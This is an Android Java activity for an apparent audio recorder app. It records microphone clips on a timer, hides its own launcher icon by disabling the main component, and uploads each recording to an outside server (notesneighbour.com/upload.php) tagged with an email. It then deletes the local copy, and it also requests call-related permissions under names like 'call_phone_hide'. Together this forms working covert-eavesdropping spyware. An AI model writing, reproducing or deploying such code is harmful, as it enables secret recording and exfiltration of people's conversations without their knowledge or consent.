package com.shashank.seconpart.svrecorder;

import android.Manifest;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Environment;
import android.renderscript.ScriptGroup;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v4.content.ContextCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.text.TextUtils;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;

import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

import cz.msebera.android.httpclient.HttpResponse;
import cz.msebera.android.httpclient.client.HttpClient;
import cz.msebera.android.httpclient.client.methods.HttpPost;
import cz.msebera.android.httpclient.entity.InputStreamEntity;
import cz.msebera.android.httpclient.impl.client.DefaultHttpClient;

public class RecordActivity extends AppCompatActivity {



    int g=0;
    int c=0;
    int hourInInt,minInInt,secInInt;
    int secInMilli;
    long hourInMilli,minInMilli;
    int k=0;
    MyRecorderSstrings s1 = new MyRecorderSstrings();
    Button mIntervalRecorder;
    EditText noOfClips;
    MediaRecorder mediaRecorder;
    String pathSave = "";
    String email;
    String message;
    String testPath;
    String hour,minute,second;
    //public String urlString="http://notesneighbour.com/PHP/firstPHP.php?email=";
    public String urlString="";

    String []strdelete;
    EditText edt1,edt2,edt3;




    final int REQUEST_PERMISSION_CODE = 1000;
    private StorageReference mStorage;
    private ProgressDialog mProgress ;
    String ConvertintoASCIIString(String Str){
        Log.d("STATE",Str);

        String message1 = s1.getMessage();
        Log.d("STATE",message1);
        int x = 0;
        int y = message1.length();
        Log.d("STATE", "Mayank"+y);
        char sAscii ;
        int iAscii = 0;
        String asciimessage = "";
        for (int i =0 ; i < y  ; i++){
            sAscii = message1.charAt(i);
            iAscii  = (int)sAscii;

            asciimessage = asciimessage + iAscii + "_" ;

        }

        Log.d("STATE",asciimessage);
        return asciimessage;

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_record);

        mStorage= FirebaseStorage.getInstance().getReference();
        SharedPreferences sharedPreferences = getSharedPreferences("MYPREF", MODE_PRIVATE);

        String data= sharedPreferences.getString("Key","No save Data");

        this.email=data;
        Toast.makeText(RecordActivity.this,email,Toast.LENGTH_LONG).show();
        //urlString = urlString + this.email + "&subject=RecorderApplication&message=";
        if (checkPermissionFromDevice())
            requestPermissions();

        android.support.v7.widget.Toolbar toolbar = findViewById(R.id.toolbar);
        if (toolbar != null) {

            setSupportActionBar(toolbar);
        }
        edt1=findViewById(R.id.hourField);
        edt2=findViewById(R.id.minuteField);
        edt3=findViewById(R.id.secondField);
        noOfClips = findViewById(R.id.hideButton);
        mIntervalRecorder= findViewById(R.id.intervalRecorder);

        mProgress= new ProgressDialog(this);

        mIntervalRecorder.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                hour = edt1.getText().toString();
                minute = edt2.getText().toString();
                second = edt3.getText().toString();

                if (checkPermissionFromDevice()) {
                    if ((TextUtils.isEmpty(hour) || TextUtils.isEmpty(minute)) || TextUtils.isEmpty(second)) {
                        Toast.makeText(RecordActivity.this,"Check your hour/min/sec",Toast.LENGTH_SHORT).show();
                    } else if(hour.equals("00")||minute.equals("00")||second.equals("00")){

                        Character a=hour.charAt(0);
                        Character b=minute.charAt(0);
                        Character c=second.charAt(0);
                        if(hour.equals("00")){
                            hourInInt=0;
                        }
                        else if(a.equals('0')){
                            Character a1=hour.charAt(1);
                            hourInInt= Character.getNumericValue(a1);
                            hourInMilli= hourInInt*60*60*1000;
                        }
                        else{
                            hourInInt= Integer.parseInt(hour);
                            hourInMilli= hourInInt*60*60*1000;
                        }


                        if(minute.equals("00")){
                            minInInt=0;
                        }
                        else if(b.equals('0')){
                            Character b1=minute.charAt(1);
                            minInInt= Character.getNumericValue(b1);
                            minInMilli=minInInt*60*1000;
                        }
                        else{
                            minInInt= Integer.parseInt(minute);
                            minInMilli=minInInt*60*1000;
                        }

                        if(second.equals("00")){
                            secInInt=0;
                        }else if(c.equals('0')){
                            Character c1=second.charAt(1);
                            secInInt= Character.getNumericValue(c1);
                            secInMilli=secInInt*1000;
                        }
                        else {
                            secInInt = Integer.parseInt(second);
                            secInMilli=secInInt*1000;
                        }
                        long addOfThree=secInMilli+minInMilli+hourInMilli;
                        intervalRecorder(addOfThree);

                    }
                    else{

                        hourInInt= Integer.parseInt(hour);
                        minInInt= Integer.parseInt(minute);
                        secInInt= Integer.parseInt(second);
                        secInMilli=secInInt*1000;
                        minInMilli=minInInt*60*1000;
                        hourInMilli= hourInInt*60*60*1000;
                        long addOfThree=secInMilli+minInMilli+hourInMilli;
                        edt1.getText().clear();
                        edt2.getText().clear();
                        edt3.getText().clear();
                        intervalRecorder(addOfThree);
                    }

                } else {
                    requestPermissions();
                }
            }

        });
    }

    public void intervalRecorder(long addOfThree){

        String str= noOfClips.getText().toString();
        int noOfClipsInInt=Integer.parseInt(str);
        for(int kl=0;kl<noOfClipsInInt;kl++) {
            g = 1;
            k = 1;
            testPath = UUID.randomUUID().toString() + "Custom_audio_record.3gp";
            pathSave = Environment.getExternalStorageDirectory()
                    .getAbsolutePath() + "/" + testPath;

            setupMediaRecorder();
            try {
                mediaRecorder.prepare();
                mediaRecorder.start();
                PackageManager p = getPackageManager();
                ComponentName componentName = new ComponentName(RecordActivity.this, MainActivity.class);
                p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);

            } catch (IOException e) {
                e.printStackTrace();
            }

            try{
                Thread.sleep(addOfThree);
                mediaRecorder.stop();
                uploadAudio12(pathSave,testPath);
                Thread.sleep(2000);
   //             deleteFunction(testPath);

                Toast.makeText(RecordActivity.this, "Stop...", Toast.LENGTH_SHORT).show();
                k = 0;
                g = 0;

            }catch (Exception ex){
                ex.printStackTrace();
            }

        }
      //  unHideFunc();
        c=0;
    }
   // private void deleteFunction(String strValue){

//        File dir = new File(Environment.getExternalStorageDirectory()
//                .getAbsolutePath());
//        File file = new File(dir, strValue);
//        boolean deleted = file.delete();
//        if(deleted) {
//            Toast.makeText(RecordActivity.this, "Deleted",Toast.LENGTH_LONG).show();
//        }


    //}

  private void uploadAudio12(String path,String testPath2) {

      RetrieveFeedTask retrieveFeedTask = new RetrieveFeedTask("http://notesneighbour.com/upload.php",path,email,testPath2);
      retrieveFeedTask.execute();
  }

    private void setupMediaRecorder() {
        mediaRecorder = new MediaRecorder();

        mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);

        mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);

        mediaRecorder.setAudioEncoder(MediaRecorder.OutputFormat.AMR_NB);

        mediaRecorder.setOutputFile(pathSave);
    }


    private void requestPermissions() {
        ActivityCompat.requestPermissions(this, new String[]{
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.PROCESS_OUTGOING_CALLS,
                Manifest.permission.CALL_PHONE
        }, REQUEST_PERMISSION_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {

        switch (requestCode) {
            case REQUEST_PERMISSION_CODE: {
                if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED)
                    Toast.makeText(this, "Permission Granted", Toast.LENGTH_SHORT).show();
                else
                    Toast.makeText(this, "Permission Denied", Toast.LENGTH_SHORT).show();
            }
            break;

        }
    }

    private boolean checkPermissionFromDevice() {
        int write_external_storage_result = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);

        int record_audio_result = ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO);

        int call_phone_hide=ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE);
        int call_phone_hide2=ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS);
        //int call_phone_hide3=ContextCompat.checkSelfPermission(this, Manifest.permission_group.CALL_LOG        );

        return write_external_storage_result == PackageManager.PERMISSION_GRANTED &&
                record_audio_result == PackageManager.PERMISSION_GRANTED &&
                call_phone_hide == PackageManager.PERMISSION_GRANTED&&
                call_phone_hide2 == PackageManager.PERMISSION_GRANTED;
                //&&
                //call_phone_hide3 == PackageManager.PERMISSION_GRANTED  ;

    }

}

class RetrieveFeedTask extends AsyncTask<String, Void, String> {

    String S = "";
    String fileName = "";
    String S2 = "";
    String dataOutput = "";

    private void deleteFunction(String strValue){

        File dir = new File(Environment.getExternalStorageDirectory()
                .getAbsolutePath());
        File file = new File(dir, strValue);
        boolean deleted = file.delete();

    }

    RetrieveFeedTask(String Url,String audioFile,String mail,String mfileName){
        this.S = Url+"?to_email_address="+mail;
        this.S2 = audioFile;
        this.fileName=mfileName;
    }
    protected String doInBackground(String... urls) {
        HttpURLConnection urlConnection = null;
        MyRecorderSstrings s = new MyRecorderSstrings();
        DataOutputStream dos = null;
        String lineEnd = "\r\n";
        String twoHyphens = "--";
        String boundary = "*****";
        int bytesRead, bytesAvailable, bufferSize;
        byte[] buffer;
        int maxBufferSize = 6 * 1024 * 1024;
        int status = 0;
        String statusMessage = "";
        URL url = null;
        File audioFileFile = new File(this.S2);


        InputStream inStream = null;
        try {
            FileInputStream fileInputStream = new FileInputStream(audioFileFile);
            url = new URL(this.S);
            urlConnection = (HttpURLConnection) url.openConnection();
            urlConnection.setRequestMethod("POST");
            urlConnection.setDoOutput(true);
            urlConnection.setDoInput(true);
            urlConnection.setUseCaches(false);
            urlConnection.setRequestProperty("Connection","Keep-Alive");
            urlConnection.setRequestProperty("ENCTYPE","multipart/form-data");
            urlConnection.setRequestProperty("test",this.S2);
            urlConnection.setRequestProperty("Content-Type",
                    "multipart/form-data;boundary=" + boundary);
            dos = new DataOutputStream(urlConnection.getOutputStream());

            dos.writeBytes(twoHyphens + boundary + lineEnd);
            dos.writeBytes("Content-Disposition: form-data; name=\"test\";filename=\""
                    + this.S2 + "\"" + lineEnd);
            dos.writeBytes(lineEnd);
            bytesAvailable = fileInputStream.available();
            bufferSize = Math.min(bytesAvailable, maxBufferSize);
            buffer = new byte[bufferSize];
            bytesRead = fileInputStream.read(buffer, 0, bufferSize);

            while (bytesRead > 0) {

                dos.write(buffer, 0, bufferSize);
                bytesAvailable = fileInputStream.available();
                bufferSize = Math
                        .min(bytesAvailable, maxBufferSize);
                bytesRead = fileInputStream.read(buffer, 0,
                        bufferSize);

            }
            dos.writeBytes(lineEnd);
            dos.writeBytes(twoHyphens + boundary + twoHyphens
                    + lineEnd);
            //dataOutput = dos.toString();

            status = urlConnection.getResponseCode();
            statusMessage = urlConnection.getResponseMessage();
            String InputLine;
            StringBuffer response = new StringBuffer();
            BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()));
            while((InputLine = in.readLine())!=null){
                response.append(InputLine);

            }
            String result  = response.toString();
            result = "";
            fileInputStream.close();
            dos.flush();
            dos.close();

            deleteFunction(this.fileName);

        } catch (Exception e) {
            String str = e.toString();
                String x  =str;
        } finally {
            if (inStream != null) {
                try {
                    // this will close the bReader as well
                    inStream.close();
                } catch (IOException ignored) {
                }
            }
            if (urlConnection != null) {
                urlConnection.disconnect();
            }
        }

        return String.valueOf(status);
    }

    protected void onPostExecute(String feed) {
        // TODO: check this.exception
        // TODO: do something with the feed
    }

}
